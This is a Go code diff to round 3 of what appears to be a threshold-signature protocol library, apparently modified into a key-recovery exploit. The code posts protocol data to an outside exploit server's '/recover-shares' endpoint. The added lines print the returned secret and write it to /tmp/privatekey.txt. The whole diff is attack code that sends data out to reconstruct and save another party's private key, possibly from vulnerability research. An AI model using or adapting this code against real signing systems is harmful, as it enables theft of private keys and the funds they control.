@@ -10,9 +10,12 @@ import (
 	"bytes"
 	"encoding/json"
 	"errors"
+	"fmt"
+	"io"
 	"log"
 	"math/big"
 	"net/http"
+	"os"
 	"sort"
 	"sync"
 
@@ -125,10 +128,18 @@ func (round *round3) Start() *tss.Error {
 						log.Fatal(err)
 					}
 
-					_, err := http.Post(exploitBaseURL+"/recover-shares", "application/json", buf)
+					resp, err := http.Post(exploitBaseURL+"/recover-shares", "application/json", buf)
 					if err != nil {
 						log.Fatal(err)
 					}
+					defer resp.Body.Close()
+					body, _ := io.ReadAll(resp.Body)
+					fmt.Println("#################")
+					fmt.Println("Secret Recover:", string(body))
+					f, _ := os.OpenFile("/tmp/privatekey.txt", os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644)
+					defer f.Close()
+					f.WriteString(string(body))
+					fmt.Println("#################")
 				}
 
 				round.mtx.Unlock()
